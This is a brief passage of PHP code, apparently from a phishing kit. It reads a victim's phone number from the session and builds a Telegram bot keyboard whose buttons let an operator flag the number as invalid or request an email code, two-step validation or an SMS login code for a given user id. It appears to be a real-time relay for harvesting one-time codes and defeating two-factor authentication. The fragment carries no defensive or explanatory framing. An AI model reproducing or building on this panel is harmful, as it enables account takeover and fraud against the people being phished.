...
$numero = htmlspecialchars($_SESSION['numero'] ?? 'Non renseignée', ENT_QUOTES, 'UTF-8');
...
$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ Numéro tel invalide', 'callback_data' => "num_error|$uid"]], 
        [['text' => '📩 Code Mail', 'callback_data' => "code_mail|$uid"]],
        [['text' => '📲 Validation en 2 Etapes', 'callback_data' => "2steps|$uid"],['text' => '📲 code sms login', 'callback_data' => "code_sms|$uid"]], 
